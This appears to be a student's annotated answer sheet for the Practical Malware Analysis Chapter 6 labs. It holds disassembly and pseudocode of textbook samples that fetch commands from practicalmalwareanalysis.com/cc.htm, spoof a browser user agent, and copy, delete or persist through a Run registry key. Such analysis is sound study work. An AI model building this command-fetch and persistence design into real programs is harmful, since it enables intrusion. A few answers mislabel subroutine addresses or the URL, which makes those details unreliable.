# Chapter 6 Labs

## Lab 6-1

In this lab, you will analyze the malware found in the file Lab06-01.exe.

### Questions
**1. What is the major code construct found in the only subroutine called by main?**

```
sub_401000:
00401000        push    ebp ------------------------------> Bookkeeping: Save ebp
00401001        mov     ebp, esp -------------------------> Bookkeeping: Move esp into ebp
00401003        push    ecx ------------------------------> ????
00401004        push    0 --------------------------------> Push 0 as a function argument 
00401006        push    0 --------------------------------> Push 0 as a function argument
00401008        call    ds:InternetGetConnectedState -----> Call InternetGetConnectedState
0040100E        mov     [ebp+var_4], eax -----------------> Move eax into [var_4]
00401011        cmp     [ebp+var_4], 0 -------------------> Compare 0 to [var_4]
00401015        jz      short loc_40102B -----------------> If var_4 is 0, jump to loc_40102B
00401017        push    offset aSuccessInterne -----------> Push aSuccessInterne(String) as a function argument.
0040101C        call    sub_40105F -----------------------> Call sub_40105F
00401021        add     esp, 4 ---------------------------> Bookkeeping: Fix the stack pointer
00401024        mov     eax, 1 ---------------------------> Move 1 into eax
00401029        jmp     short loc_40103A -----------------> Jump to loc_40103A
0040102B    loc_40102B:
0040102B        push    offset aError1_1NoInte -----------> Push aError1_1NoInte(String) as a function argument
00401030        call    sub_40105F -----------------------> Call sub_40105F
00401035        add     esp, 4 ---------------------------> Bookkeeping: Fix the stack pointer
00401038        xor     eax, eax -------------------------> Clear eax
0040103A    loc_40103A:
0040103A        mov     esp, ebp -------------------------> Bookkeeping: Move ebp into esp
0040103C        pop     ebp ------------------------------> Bookkeeping: Restore ebp
0040103D        retn


My attempt at disassembly:

  int var_4 = InternetGetConnectedState(0, 0);
  if(var_4 == 0){
    sub_401054("aError1_1NoInte");
  } else {
    sub_40105F("aSuccessInterne");
  }


Major code construct is a simple conditional.
```

**2. What is the subroutine located at ```0x40105F?```**

```
Judging by the usage in question 1, sub_40105F is a printf function.
```

**3. What is the purpose of this program?**

```
The program lets the user know if they are currently connected to the internet.
```

## Lab 6-2

Analyze the malware found in the file Lab06-02.exe.

### Questions
**1. What operation does the first subroutine called by main perform?**

```
sub_401000:
.text:00401001      mov     ebp, esp ------------------------> Bookkeeping: Move esp into ebp
.text:00401003      push    ecx -----------------------------> ?????
.text:00401004      push    0 -------------------------------> Push 0 as a function argument 
.text:00401006      push    0 -------------------------------> Push 0 as a function argument
.text:00401008      call    ds:InternetGetConnectedState ----> Call InternetGetConnectedState
.text:0040100E      mov     [ebp+var_4], eax ----------------> Move eax into var_4
.text:00401011      cmp     [ebp+var_4], 0 ------------------> Compare var_4 to 0
.text:00401015      jz      short loc_40102B ----------------> If var_4 is 0, jump to loc_40102B
.text:00401017      push    offset aSuccessInterne ----------> Push aSuccessInterne(String) as a function argument.
.text:0040101C      call    sub_40117F ----------------------> Call sub_40117F
.text:00401021      add     esp, 4 --------------------------> Bookkeeping: Fix the stack pointer
.text:00401024      mov     eax, 1 --------------------------> Move 1 into eax(return value)
.text:00401029      jmp     short loc_40103A ----------------> Jump to loc_40103A
.text:0040102B  loc_40102B:
.text:0040102B      push    offset aError1_1NoInte ----------> Push aError1_1NoInte(String) as a function argument.
.text:00401030      call    sub_40117F ----------------------> Call sub_40117F
.text:00401035      add     esp, 4 --------------------------> Bookkeeping: Fix the stack pointer
.text:00401038      xor     eax, eax ------------------------> Clear eax(return value)
.text:0040103A  loc_40103A:
.text:0040103A      mov     esp, ebp ------------------------> Bookkeeping: Move ebp into esp
.text:0040103C      pop     ebp -----------------------------> Bookkeeping: Restore ebp
.text:0040103D      retn

This is very similar, if not the same, to the subroutine in lab 1.
It checks to see if you are connected to the internet or not.
If you are connected to the internet, return 1.
If you are not connected to the internet, return 0.
```

**2. What is the subroutine located at 0x40117F?**

```
Judging by the usage in question 1, sub_40105F is a printf function.
```

**3. What does the second subroutine called by main do?**

```
sub_401040:
00401041        mov     ebp, esp ---------------------------------> Bookkeeping: Move esp into ebp
00401043        sub     esp, 210h --------------------------------> Bookkeeping: Create space on the stack for local variables.
00401049        push    0 ----------------------------------------> Push 0(dwFlags) as a function argument.
0040104B        push    0 ----------------------------------------> Push 0(lpszProxyBypass) as a function argument.
0040104D        push    0 ----------------------------------------> Push 0(lpszProxy) as a function argument.
0040104F        push    0 ----------------------------------------> Push 0(dwAccessType) as a function argument.
00401051        push    offset szAgent ---------------------------> Push szAgent("Internet Explorer 7.5/pma") as a function argument.
00401056        call    ds:InternetOpenA -------------------------> Call InternetOpenA
0040105C        mov     [ebp+hInternet], eax ---------------------> Move eax(InternetOpenA result) into hInternet
0040105F        push    0 ----------------------------------------> Push 0(dwContext) as a function argument
00401061        push    0 ----------------------------------------> Push 0(dwFlags) as a function argument
00401063        push    0 ----------------------------------------> Push 0(dwHeadersLength) as a function argument
00401065        push    0 ----------------------------------------> Push 0(lpszHeaders) as a function argument
00401067        push    offset szUrl -----------------------------> Push szUrl("http://www.practicalmalwareanalysis.com") as a function argument
0040106C        mov     eax, [ebp+hInternet] ---------------------> Move hInternet to eax.
0040106F        push    eax --------------------------------------> Push eax(hInternet) as a function argument.
00401070        call    ds:InternetOpenUrlA ----------------------> Call InternetOpenUrlA
00401076        mov     [ebp+hFile], eax -------------------------> Move eax(InternetOpenUrlA result) into hFile
00401079        cmp     [ebp+hFile], 0 ---------------------------> Compare hFile to 0
0040107D        jnz     short loc_40109D -------------------------> If hFile is not zero, jump to loc_40109D
0040107F        push    offset aError2_1FailTo -------------------> Push aError2_1FailTo("Error 2.1: Fail to OpenUrl\n") as a function argument.
00401084        call    printf -----------------------------------> Call printf
00401089        add     esp, 4 -----------------------------------> Bookkeeping: Fix the stack pointer
0040108C        mov     ecx, [ebp+hInternet] ---------------------> Move hInternet into ecx
0040108F        push    ecx --------------------------------------> Push ecx(hInternet) as a function argument
00401090        call    ds:InternetCloseHandle -------------------> Call InternetCloseHandle
00401096        xor     al, al -----------------------------------> Clear al
00401098        jmp     loc_40112C -------------------------------> Jump to loc_40112C
0040109D    loc_40109D:
0040109D        lea     edx, [ebp+dwNumberOfBytesRead] -----------> Load the address of dwNumberOfBytesRead into edx
004010A0        push    edx --------------------------------------> Push edx(lpdwNumberOfBytesRead) as a function argument
004010A1        push    200h -------------------------------------> Push 200h(dwNumberOfBytesToRead) as a function argument
004010A6        lea     eax, [ebp+Buffer] ------------------------> Load the address of Buffer into eax
004010AC        push    eax --------------------------------------> Push eax(lpBuffer) as a function argument
004010AD        mov     ecx, [ebp+hFile] -------------------------> Move hfile into ecx
004010B0        push    ecx --------------------------------------> Push ecx(hFile) as a function argument
004010B1        call    ds:InternetReadFile ----------------------> Call InternetReadFile
004010B7        mov     [ebp+var_4], eax -------------------------> Move eax(InternetReadFile result) into var_4
004010BA        cmp     [ebp+var_4], 0 ---------------------------> Compare var_4 to 0
004010BE        jnz     short loc_4010E5 -------------------------> If var_4 is not zero, jump to loc_4010E5
004010C0        push    offset aError2_2FailTo -------------------> Push aError2_2FailTo("Error 2.2: Fail to ReadFile\n") as a function argument
004010C5        call    printf -----------------------------------> Call printf
004010CA        add     esp, 4 -----------------------------------> Bookkeeping: Fix the stack pointer
004010CD        mov     edx, [ebp+hInternet] ---------------------> Move hInternet into edx
004010D0        push    edx --------------------------------------> Push edx(hInternet) as a function argument
004010D1        call    ds:InternetCloseHandle -------------------> Call InternetCloseHandle
004010D7        mov     eax, [ebp+hFile] -------------------------> Move hFile into eax
004010DA        push    eax --------------------------------------> Push eax(hInternet) as a function argument
004010DB        call    ds:InternetCloseHandle -------------------> Call InternetCloseHandle
004010E1        xor     al, al -----------------------------------> Clear al
004010E3        jmp     short loc_40112C -------------------------> Jump to loc_40112C
004010E5    loc_4010E5:
004010E5        movsx   ecx, byte ptr [ebp+Buffer] ---------------> Move [Buffer] into ecx with sign extension
004010EC        cmp     ecx, 3Ch ---------------------------------> Compare ecx([Buffer]) to 3Ch
004010EF        jnz     short loc_40111D -------------------------> If ecx([Buffer]) is not equal to 3Ch, jump to loc_40111D
004010F1        movsx   edx, byte ptr [ebp+Buffer+1] -------------> Move [Buffer+1] into edx with sign extension
004010F8        cmp     edx, 21h ---------------------------------> Compare edx([Buffer+1]) to 21h
004010FB        jnz     short loc_40111D -------------------------> If edx([Buffer+1]) is not equal to 21h, jump to loc_40111D
004010FD        movsx   eax, byte ptr [ebp+Buffer+2] -------------> Move [Buffer+2] into eax with sign extension
00401104        cmp     eax, 2Dh ---------------------------------> Compare eax([Buffer+2]) to 2Dh
00401107        jnz     short loc_40111D -------------------------> If eax([Buffer+2]) is not equal to 2Dh, jump to loc_40111D
00401109        movsx   ecx, byte ptr [ebp+Buffer+3] -------------> Move [Buffer+3] into ecx with sign extension
00401110        cmp     ecx, 2Dh ---------------------------------> Compare ecx([Buffer+3]) to 2Dh
00401113        jnz     short loc_40111D -------------------------> If ecx([Buffer+3]) is not equal to 2Dh, jump to loc_40111D
00401115        mov     al, [ebp+var_20C] ------------------------> mov var_20c into al
0040111B        jmp     short loc_40112C -------------------------> Jump to loc_40112C
0040111D    loc_40111D:
0040111D        push    offset aError2_3FailTo -------------------> Push aError2_3FailTo("Error 2.3: Fail to get command\n") as a function argument.
00401122        call    printf -----------------------------------> Call printf
00401127        add     esp, 4 -----------------------------------> Bookkeeping: Fix the stack pointer
0040112A        xor     al, al -----------------------------------> Clear al
0040112C    loc_40112C:
0040112C        mov     esp, ebp ---------------------------------> Bookkeeping: Move ebp into esp
0040112E        pop     ebp --------------------------------------> Bookkeeping: Restore ebp
0040112F        retn 




Pseudocode:

  call InternetOpenA("Internet Explorer 7.5/pma", dwAccessType, lpszProxy, lpszProxyBypass, dwFlags)
  if successful:
    call InternetOpenUrlA(hInternet, "http://www.practicalmalwareanalysis.com/cc.htm", lpszHeaders, dwHeadersLength, dwFlags, dwContext)
    if successful:
      call InternetReadFile(hFile, &Buffer, dwNumberOfBytesToRead, &dwNumberOfBytesRead)
      if successful:
        if &Buffer == "<!--"
          command = Buffer[4]
          printf("Success: Parsed command is %c", command)
```

**4. What type of code construct is used in this subroutine?**

```
Nested if statement.
```

**5. Are there any network-based indicators for this program?**

```
It makes calls to:
  InternetOpenA
  InternetOpenUrlA
  InternetReadFile

It contains strings:
  "http://www.practicalmalwareanalysis.com"
  "Error 2.1: Fail to OpenUrl\n"
  "Internet Explorer 7.5/pma"
```

**6. What is the purpose of this malware?**

```
It retrieves commands from:
  http://www.practicalmalwareanalysis.com
```

## Lab 6-3

In this lab, we’ll analyze the malware found in the file Lab06-03.exe.

### Questions
**1. Compare the calls in main to Lab 6-2’s main method. What is the new function called from main?**

```
sub_401130
```

**2. What parameters does this new function take?**

```
.text:00401130 arg_0               = byte  ptr  8
.text:00401130 lpExistingFileName  = dword ptr  0Ch
```

**3. What major code construct does this function contain?**

```
Switch statement with 5 cases.
```

**4. What can this function do?**

```
This function checks a command and performs one of the following functions associated with it:
  CopyFileA
  DeleteFileA
  RegOpenKeyExA
  Sleep

If the command is not valid, it prints:
  "Not a valid command provided"
```

**5. Are there any host-based indicators for this malware?**

```
Software\Microsoft\Windows\CurrentVersion\Run\Malware
C:\Temp\cc.exe
```

**6. What is the purpose of this malware?**

```
This malware obtains a command from:
  "http://www.practicalmalwareanalysis.com/cc.htm"

It then runs the command through a switch statement and performs the desired action.
```

## Lab 6-4

In this lab, we’ll analyze the malware found in the file Lab06-04.exe.

### Questions
**1. What is the difference between the calls made from the main method in Labs 6-3 and 6-4?**

```
The main method in 6-3 executes only one command.
The main method in 6-4 executes executes multiple commands.
```

**2. What new code construct has been added to main?**

```
A for loop which executes 1440 times.
```

**3. What is the difference between this lab’s parse HTML function and those of the previous labs?**

```
The function takes an argument in 6-4 malware sample.
The argument sets the version of Internet Explorer reported as the User-Agent.
```

**4. How long will this program run? (Assume that it is connected to the Internet.)**

```
For 1440 iterations of the for loop.
The actual length of time depends on the amount of commands call the sleep function.
```

**5. Are there any new network-based indicators for this malware?**

```
The user-agent can now be set as various versions, but the prefix remains constant.
```

**6. What is the purpose of this malware?**

```
This malware obtains a command from:
  "http://www.practicalmalwareanalysis.com/cc.htm"

It then runs the command through a switch statement and performs the desired action.

This repeats up to 1440 times.
```
